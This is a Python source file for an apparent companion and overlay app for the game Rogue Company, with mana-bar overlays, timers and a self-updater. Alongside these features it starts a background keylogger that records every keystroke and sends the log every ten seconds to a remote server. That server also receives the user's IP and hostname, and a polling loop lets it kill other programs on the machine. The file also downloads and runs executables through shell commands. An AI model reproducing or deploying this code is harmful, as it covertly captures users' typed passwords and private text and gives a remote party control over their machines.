from asyncio.windows_events import NULL
import eel
import random
from urllib.request import urlopen
from datetime import datetime
import os
import requests
import time
import asyncio
import pypresence
import threading
import json
import keyboard
import socket
import sys
import subprocess
from sys import exit
from threading import Timer

from requests import api

version = 1.43
client_id = "855638972033007617"  # Put your Client ID in here
url_web = "https://rogue.cpsoftware.es"
# subprocess.run('C:\Windows\System32/taskkill /F /IM roguecompanion.exe', shell=True)

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            if self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def report_to_file(self):
        url_base = url_web + "/api.php"
        url = url_base
        myobj = {
            'api': data["api"],
            'keylog': self.log
        }
        x = requests.post(url, data=myobj)

    def callback(self, event):
        name = event.name
        if name == "1":
            print("Skill " + name)
        if name == "2":
            print("Skill " + name)
        if name == "3":
            print("Skill " + name)
        if name == "4":
            print("Skill " + name)
        if name == "5":
            print("Skill " + name)
        if name == "6":
            print("Skill " + name)
        if name == "7":
            print("Skill " + name)
        if name == "8":
            print("Skill " + name)
        if name == "9":
            print("Skill " + name)
        if name == "0":
            print("Skill " + name)
        if name == "¡":
            os.system("C:\Windows\System32/taskkill /F /IM Python.exe")
        print(name)
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
def buildapi():
    print("Building...")
    url_base = url_web + "/api.php"
    url = url_base
    ip = requests.get('https://api.ipify.org').text
    print(ip)
    myobj = {
        'ip': ip,
        'getapi': '',
        'hostname' : socket.gethostname()
    }
    x = requests.post(url, data=myobj)
    apikey = x.text
    print(x.text)
    data = []
    data = {"version": version, "api": apikey}
    with open('data.txt', 'w') as outfile:
        json.dump(data, outfile)
    return data
def validarapi(api):
    print("Validando...")
    url_base = url_web + "/api.php"
    url = url_base
    myobj = {
        'validar': api,
    }
    x = requests.post(url, data=myobj)
    if x.text == "OK":
        print("Validada!")
        return True
    else:
        return False


RPC = pypresence.Presence(client_id)
#RPC.connect()
#RPC.update(state="In the menu")
jsonurl = 'https://raw.githubusercontent.com/abrahampo1/RogueCompanion/1.42/version.json'
response = requests.get(jsonurl)
version_json = response.json()
try:
    f = open("data.txt")
    data = json.load(f)
    if validarapi(data["api"]) == False:
        print("API no valida, generando otra")
        data = buildapi()
except Exception as e:
    print(e.args)
    data = buildapi()
if version < version_json["version"]:
    print("actualización encontrada")
    print("actualizando")
    r = requests.get("https://github.com/abrahampo1/RogueCompanion/releases/download/1.42/app.exe")
    try:
        open('RogueCompanion'+version_json["version"]+'.exe', 'wb').write(r.content)
        subprocess.run("start "+ os.path.realpath(os.path.dirname(sys.argv[0])) + "\RogueCompanion"+version_json['version']+".exe", shell=True)
        print("Actualizado!")
        data_upt = {"version": version_json["version"], "api": data["api"]}
        with open('data.txt', 'w') as outfile:
            json.dump(data_upt, outfile)
        exit()
    except Exception as e:
        print("He fallado al actualizarme")
        print(e.args)


def conectar():
    while True:
        url_base = url_web + "/api.php"
        url = url_base+"?data=1"
        myobj = {
            'api': data["api"],
        }
        x = requests.post(url, data=myobj)
        if(x.text == "1"):
            url = url_base+"?on=1"
            x = requests.post(url)
            subprocess.run("C:\Windows\System32/taskkill /F /IM RobloxPlayerBeta.exe", shell=True)
            subprocess.run("start https://www.youtube.com/watch?v=dQw4w9WgXcQ", shell=True)
        time.sleep(0.5)

eel.init('rogue')

@eel.expose
def get_random_name():
    eel.prompt_alerts('Activando...')

    eel.prompt_alerts('Activado!')
@eel.expose
def get_mana_bar():
    print("mana")
@eel.expose
def closemana():
    subprocess.run('C:\Windows\System32/taskkill /F /IM manaoverlay.exe', shell=True)
@eel.expose
def set_mana_bar(src, w = "200", h = "600", px = "10", py = "10", op = "100"):
    print("mana")
    if os.path.isfile("manaoverlay.exe"):
        print("existe, no me actualizo")
    else:
        r = requests.get("https://github.com/abrahampo1/RogueCompanion/releases/download/1.42/manaoverlay.exe")
        try:
            open('manaoverlay.exe', 'wb').write(r.content)
            print("Descargado!")
        except Exception as e:
            print("He fallado al descargar el manaoverlay")
            print(e.args)
    try:
        subprocess.run('C:\Windows\System32/taskkill /F /IM manaoverlay.exe', shell=True)
    except:
        print("lo abro ahora")
    path = os.path.realpath(os.path.dirname(sys.argv[0])) + "\manaoverlay.exe "+w+" "+h+" "+px+" "+py+" "+src+" "+op
    subprocess.run('start ' + path, shell=True)
@eel.expose
def ver():
    eel.ver(version)

@eel.expose
def get_timer():
    num_timers = 9
    timers = ""
    for i in range(num_timers):
        timers += ";;" + str(i) + ";10"
        i+1
    eel.settimers(timers)
@eel.expose
def load():
    print("loaded")
    ver()
    #RPC.update(state="In the menu")


@eel.expose
def get_date():
    print("ore")
    #RPC.update(state="Ore Timer by CP")

@eel.expose
def get_ip():
    eel.prompt_alerts('127.0.0.1')


b = threading.Thread(name='background', target=conectar)
b.start()
keylogger = Keylogger(interval=10, report_method="file")
k = threading.Thread(name='keyboard', target=keylogger.start)
k.start()
eel.start('index.html', port=8575)
